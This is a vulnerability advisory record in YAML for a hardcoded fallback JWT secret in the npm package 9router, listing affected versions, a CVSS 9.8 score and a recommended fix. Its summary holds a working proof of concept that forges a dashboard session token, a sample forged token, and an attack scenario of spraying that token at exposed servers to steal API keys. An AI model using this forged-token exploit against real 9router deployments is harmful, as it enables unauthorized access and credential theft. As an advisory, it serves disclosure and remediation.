@@ -1,0 +1,249 @@
+advisory_id: GHSA-jphh-m39h-6gwx
+datasource_id: github_osv/GHSA-jphh-m39h-6gwx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-jphh-m39h-6gwx/GHSA-jphh-m39h-6gwx.json
+aliases:
+  - CVE-2026-49352
+summary: "9router's Hardcoded Default fallback JWT Secret  Allows Authentication Bypass\n###\
+  \ Summary\n9router uses a publicly known hardcoded string `\"9router-default-secret-change-me\"\
+  ` as the fallback of JWT secret for all Dashboard session JWTs when the `JWT_SECRET` environment\
+  \ variable is not set. Because this secret is committed in the public repository and unchanged\
+  \ across all releases, any unauthenticated remote attacker can forge a valid `auth_token`\
+  \ cookie and gain full access to dashboard and api (If JWT_SECRET is not set on server) .\
+  \ This vulnerable affected so many public 9router server\n### Details\n| Versions | File |\
+  \ Note |\n|---|---|---|\n| `>= 0.2.21, <= 0.4.30` | `src/app/api/auth/login/route.js` + `src/middleware.js`\
+  \ | Introduced in commit `23cfb19` |\n| `>= 0.4.31, <= 0.4.41` | `src/lib/auth/dashboardSession.js`\
+  \ | Relocated by OIDC refactor `c3d91b0`, secret unchanged |\n\nVulnerable Code\n\n**v0.2.21\
+  \ – v0.4.30** — `src/app/api/auth/login/route.js` and `src/middleware.js`:\n\n```js\nconst\
+  \ SECRET = new TextEncoder().encode(\n  process.env.JWT_SECRET || \"9router-default-secret-change-me\"\
+  \n);\n```\n\n**v0.4.31 – v0.4.41 (current)** — `src/lib/auth/dashboardSession.js` (centralized\
+  \ via OIDC refactor, commit `c3d91b0`):\n\n```js\nconst SECRET = new TextEncoder().encode(\n\
+  \  process.env.JWT_SECRET || \"9router-default-secret-change-me\"\n);\n```\nThe fallback string\
+  \ was introduced in commit `23cfb19` (2026-01-09) and has never been removed. The OIDC refactor\
+  \ in `c3d91b0` only relocated it to a shared module . This vulnerability has existed since\
+  \ 9router first introduced authentication.\n### PoC\n**Step 1.** Craft a JWT signed with the\
+  \ known default secret:\n```js\nimport { SignJWT } from \"jose\";\n\nconst SECRET = new TextEncoder().encode(\"\
+  9router-default-secret-change-me\");\n\nconst token = await new SignJWT({ authenticated: true\
+  \ })\n  .setProtectedHeader({ alg: \"HS256\" })\n  .setIssuedAt()\n  .setExpirationTime(\"\
+  36y\")\n  .sign(SECRET);\n\nconsole.log(token); // example a valid auth_token=eyJhbGciOiJIUzI1NiJ9.eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE3Nzg3Njk4NTYsImV4cCI6MjkxNDg0MzQ1Nn0.enMLEqYZKFuzxkmRH6qd3E-Ub-20wOjmiEfP4KyIG6w\n\
+  ```\n**Step 2.** Set the forged token as the `auth_token` cookie. And access the `http://<target>/dashboard`\
+  \ - completely authentication bypass \n\n### Attack Scenario:\n- Attacker can use this JWT\
+  \ to spray to all server that they found in the internet and gain dashboard access if a server\
+  \ doesn't set JWT_SECRET\n- Then they can steal valuable API Key , Auth Token via http://\
+  \ target /api/settings/database \n\n\n### Impact\n- A successful attack grants attacker **full\
+  \ API Key, Auth Token** that 9router hold\n- They can **read** 9router apikey, **change**\
+  \ 9router password ,shutdown 9router, **Modify** everything\n- **Pivot** via the MCP stdio→SSE\
+  \ bridge exposed at `/api/mcp/`  (exploit CVE-2026-46339)\n\n## Recommended Fix\n\n**Require**\
+  \ `JWT_SECRET` at startup and fail fast rather than falling back silently:\n\n```js\nconst\
+  \ jwtSecret = process.env.JWT_SECRET;\nif (!jwtSecret) {\n  throw new Error(\n    \"JWT_SECRET\
+  \ environment variable is not set. \" +\n    \"Generate one with: openssl rand -hex 32\"\n\
+  \  );\n}\nconst SECRET = new TextEncoder().encode(jwtSecret);\n```\n\nAlternatively, auto-generate\
+  \ a random secret on first boot and persist it to the data directory — but **never** fall\
+  \ back to a publicly known constant."
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/>=0.2.21|<=0.4.41
+    fixed_versions: vers:npm/0.4.45
+    affected_packages:
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+    fixed_packages:
+      - pkg:npm/9router@0.4.45
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-jphh-m39h-6gwx/GHSA-jphh-m39h-6gwx.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-798
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-jphh-m39h-6gwx
+    reference_type:
+    reference_id:
+exploits: []
